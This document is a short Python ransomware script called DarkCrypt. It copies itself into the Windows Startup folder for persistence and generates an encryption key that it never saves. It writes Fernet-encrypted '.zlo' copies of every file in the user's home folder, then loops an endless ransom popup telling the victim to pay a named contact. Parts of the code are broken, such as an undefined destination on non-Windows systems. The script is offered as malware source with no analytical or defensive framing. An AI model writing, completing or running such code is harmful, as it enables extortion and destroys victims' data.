# Encoder DarkCrypt
import os
import shutil
import sys

# Copy archive
script_path = os.path.abspath(__file__)
osystem = sys.platform
if osystem == 'win32' or osystem == 'cygwin':
    destino = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
else:
    os.remove(script_path)

destino_path = os.path.join(destino, os.path.basename(script_path))
try:
    shutil.copy(script_path, destino_path)

except Exception as e:
    sys.exit()

# Encrypter code
# Import coder
from cryptography.fernet import Fernet
import os

# Generate Key
key = Fernet.generate_key()

# Encrypter
def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    encrypted_file_path = file_path + ".zlo"
    with open(encrypted_file_path, "wb") as file:
        file.write(encrypted_data)

User = 'urs'
User_PC = os.path.expanduser('~')

for file in os.listdir(User_PC):
    file_path = os.path.join(User_PC, file)
    if os.path.isfile(file_path):
        encrypt_file(file_path, key)

while True:
    os.system(f'msg * UPSS Ransomware!!. Your data has been encrypted by DarkCrypt.. If you wish to recover it please contact @{User}, otherwise your data will be deleted and never recovered, if you close this window your only method to recover your files will be lost.')
